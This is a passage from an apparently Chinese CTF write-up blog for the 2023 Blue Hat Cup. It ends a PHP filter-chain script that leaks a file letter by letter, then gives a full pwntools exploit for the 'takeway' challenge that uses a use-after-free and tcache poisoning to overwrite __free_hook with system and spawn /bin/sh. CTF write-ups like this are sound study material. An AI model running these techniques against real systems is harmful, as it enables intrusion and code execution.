+</span></span><span class=line><span class=cl>        <span class=nx>prefix</span> <span class=o>=</span> <span class=nx>f</span><span class=s1>&#39;{header}|{get_nth(i)}|convert.base64-encode&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=nx>s</span> <span class=o>=</span> <span class=nx>find_letter</span><span class=p>(</span><span class=nx>prefix</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>s</span> <span class=o>==</span> <span class=s1>&#39;M&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=c1># 0 - 3
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nx>prefix</span> <span class=o>=</span> <span class=nx>f</span><span class=s1>&#39;{header}|{get_nth(i)}|convert.base64-encode|{r2}&#39;</span>
+</span></span><span class=line><span class=cl>            <span class=nx>ss</span> <span class=o>=</span> <span class=nx>find_letter</span><span class=p>(</span><span class=nx>prefix</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nx>ss</span> <span class=nx>in</span> <span class=s1>&#39;CDEFGH&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=nx>letter</span> <span class=o>=</span> <span class=s1>&#39;0&#39;</span>
+</span></span><span class=line><span class=cl>            <span class=nx>elif</span> <span class=nx>ss</span> <span class=nx>in</span> <span class=s1>&#39;STUVWX&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=nx>letter</span> <span class=o>=</span> <span class=s1>&#39;1&#39;</span>
+</span></span><span class=line><span class=cl>            <span class=nx>elif</span> <span class=nx>ss</span> <span class=nx>in</span> <span class=s1>&#39;ijklmn&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=nx>letter</span> <span class=o>=</span> <span class=s1>&#39;2&#39;</span>
+</span></span><span class=line><span class=cl>            <span class=nx>elif</span> <span class=nx>ss</span> <span class=nx>in</span> <span class=s1>&#39;yz*&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=nx>letter</span> <span class=o>=</span> <span class=s1>&#39;3&#39;</span>
+</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=nx>err</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;bad num ({ss})&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nx>elif</span> <span class=nx>s</span> <span class=o>==</span> <span class=s1>&#39;N&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=c1># 4 - 7
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nx>prefix</span> <span class=o>=</span> <span class=nx>f</span><span class=s1>&#39;{header}|{get_nth(i)}|convert.base64-encode|{r2}&#39;</span>
+</span></span><span class=line><span class=cl>            <span class=nx>ss</span> <span class=o>=</span> <span class=nx>find_letter</span><span class=p>(</span><span class=nx>prefix</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nx>ss</span> <span class=nx>in</span> <span class=s1>&#39;CDEFGH&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=nx>letter</span> <span class=o>=</span> <span class=s1>&#39;4&#39;</span>
+</span></span><span class=line><span class=cl>            <span class=nx>elif</span> <span class=nx>ss</span> <span class=nx>in</span> <span class=s1>&#39;STUVWX&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=nx>letter</span> <span class=o>=</span> <span class=s1>&#39;5&#39;</span>
+</span></span><span class=line><span class=cl>            <span class=nx>elif</span> <span class=nx>ss</span> <span class=nx>in</span> <span class=s1>&#39;ijklmn&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=nx>letter</span> <span class=o>=</span> <span class=s1>&#39;6&#39;</span>
+</span></span><span class=line><span class=cl>            <span class=nx>elif</span> <span class=nx>ss</span> <span class=nx>in</span> <span class=s1>&#39;yz*&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=nx>letter</span> <span class=o>=</span> <span class=s1>&#39;7&#39;</span>
+</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=nx>err</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;bad num ({ss})&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nx>elif</span> <span class=nx>s</span> <span class=o>==</span> <span class=s1>&#39;O&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=c1># 8 - 9
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nx>prefix</span> <span class=o>=</span> <span class=nx>f</span><span class=s1>&#39;{header}|{get_nth(i)}|convert.base64-encode|{r2}&#39;</span>
+</span></span><span class=line><span class=cl>            <span class=nx>ss</span> <span class=o>=</span> <span class=nx>find_letter</span><span class=p>(</span><span class=nx>prefix</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nx>ss</span> <span class=nx>in</span> <span class=s1>&#39;CDEFGH&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=nx>letter</span> <span class=o>=</span> <span class=s1>&#39;8&#39;</span>
+</span></span><span class=line><span class=cl>            <span class=nx>elif</span> <span class=nx>ss</span> <span class=nx>in</span> <span class=s1>&#39;STUVWX&#39;</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=nx>letter</span> <span class=o>=</span> <span class=s1>&#39;9&#39;</span>
+</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=nx>err</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;bad num ({ss})&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=nx>err</span><span class=p>(</span><span class=s1>&#39;wtf&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>print</span><span class=p>(</span><span class=nx>end</span><span class=o>=</span><span class=nx>letter</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nx>o</span> <span class=o>+=</span> <span class=nx>letter</span>
+</span></span><span class=line><span class=cl>    <span class=nx>sys</span><span class=o>.</span><span class=nx>stdout</span><span class=o>.</span><span class=nx>flush</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>We are done!! :)
+</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>print</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=nx>d</span> <span class=o>=</span> <span class=nx>b64decode</span><span class=p>(</span><span class=nx>o</span><span class=o>.</span><span class=nx>encode</span><span class=p>()</span> <span class=o>+</span> <span class=nx>b</span><span class=s1>&#39;=&#39;</span> <span class=o>*</span> <span class=mi>4</span><span class=p>)</span>
+</span></span></code></pre></div><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101214712.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101214712.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101214712.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101214712.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101214712.png title=img></p><h2 id=pwn>Pwn</h2><h3 id=takeway>takeway</h3><p>dele存在uaf，可以用来泄露地址，堆风水构造大块堆泄露libc,最后改写free_hook。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>decimal</span> <span class=kn>import</span> <span class=n>setcontext</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span> <span class=o>=</span> <span class=s1>&#39;linux&#39;</span><span class=p>,</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;amd64&#39;</span><span class=p>,</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>choice</span><span class=o>=</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>choice</span><span class=o>==</span><span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>=</span><span class=n>process</span><span class=p>(</span><span class=s1>&#39;./takeway&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>=</span><span class=n>remote</span><span class=p>(</span><span class=s2>&#34;101.200.234.115&#34;</span><span class=p>,</span> <span class=mi>44624</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>elf</span><span class=o>=</span><span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./takeway&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>=</span><span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc-2.31.so&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>leak</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>name</span><span class=p>,</span><span class=n>addr</span>          <span class=p>:</span><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>name</span> <span class=o>+</span> <span class=s2>&#34; : 0x</span><span class=si>%x</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>addr</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>debug</span><span class=p>(</span><span class=n>cmd</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>io</span><span class=p>,</span><span class=n>cmd</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>pause</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>choice</span><span class=p>(</span><span class=n>opt</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Please input your choose: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>opt</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>alloc</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span><span class=n>name</span><span class=o>=</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>,</span><span class=n>remark</span><span class=o>=</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>choice</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Please input your order index</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Please input your food name: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;remark: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>remark</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>dele</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>choice</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Please input your order index: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span><span class=n>name</span><span class=o>=</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>choice</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Please input index: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;New food name is: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>choice</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Please input index: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>dele</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>dele</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;The remark of this order is: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>leak_addr</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>heap_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>leak_addr</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>target_addr</span> <span class=o>=</span> <span class=n>heap_base</span><span class=o>+</span><span class=mh>0x290</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s2>&#34;heap_base &#34;</span><span class=p>,</span><span class=n>heap_base</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s2>&#34;target_addr &#34;</span><span class=p>,</span><span class=n>target_addr</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;New food name is: &#39;</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>target_addr</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>target_addr</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span><span class=o>+</span><span class=mh>0x1330</span><span class=p>))</span> <span class=c1>#   target_addr</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x18</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>alloc</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span><span class=o>+</span><span class=mh>0x1328</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x421</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>dele</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>libc_base</span><span class=o>=</span><span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x7f</span><span class=s1>&#39;</span><span class=p>)[</span><span class=o>-</span><span class=mi>6</span><span class=p>:]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x1ECBE0</span>
+</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s2>&#34;libc base&#34;</span><span class=p>,</span><span class=n>libc_base</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s2>&#34;tcache idx&#34;</span><span class=p>,</span><span class=n>target_addr</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;New food name is: &#39;</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>system_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>free_hook</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;__free_hook&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>free_hook</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>system_addr</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>dele</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></div><h2 id=re>Re</h2><h3 id=story>story</h3><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101214713.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101214713.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101214713.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101214713.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101214713.png title=img></p><p>输入得到flag</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2023-09-10</span></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/%E8%93%9D%E5%B8%BD%E6%9D%AF2023/index.md target=_blank>阅读原始文档</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 Twitter" data-sharer=twitter data-url=https://githubmof.github.io/%E8%93%9D%E5%B8%BD%E6%9D%AF2023/ data-title=蓝帽杯2023 data-hashtags=ctf><i class="fab fa-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=https://githubmof.github.io/%E8%93%9D%E5%B8%BD%E6%9D%AF2023/ data-hashtag=ctf><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/ctf/>ctf</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/ class=prev rel=prev title=羊城杯2023><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>羊城杯2023</a>
+<a href=/nepctf2023/ class=next rel=next title=NepCTF2023>NepCTF2023<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line><span id=run-time></span></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2021 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=https://github.com/githubmof target=_blank>mof</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><div class=sidebar_wo><div id=leimu><img src=/images/sidebar_wo/leimuA.png alt=雷姆 onmouseover=/images/sidebar_wo/leimuB.png onmouseout=/images/sidebar_wo/leimuA.png title=回到顶部></div><div class=sidebar_wo id=lamu><img src=/images/sidebar_wo/lamuA.png alt=雷姆 onmouseover=/images/sidebar_wo/lamuB.png onmouseout=/images/sidebar_wo/lamuA.png title=回到底部></div></div><link rel=stylesheet href=/lib/katex/katex.min.css><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/algoliasearch/algoliasearch-lite.umd.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/sharer/sharer.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js></script><script type=text/javascript src=/lib/katex/contrib/auto-render.min.js></script><script type=text/javascript src=/lib/katex/contrib/copy-tex.min.js></script><script type=text/javascript src=/lib/katex/contrib/mhchem.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:10},comment:{},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{algoliaAppID:"06C5J0ZYUN",algoliaIndex:"githubmof",algoliaSearchKey:"a3cde6a74f0166767bdda9dbe2235fdb",highlightTag:"em",maxResultLength:10,noResultsFound:"没有找到结果",snippetLength:50,type:"algolia"}}</script><script type=text/javascript src=/js/theme.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/jquery@2.1.3/dist/jquery.min.js></script>
+<script type=text/javascript src=https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js></script><script type=text/javascript src=/js/custom.js></script></body></html>
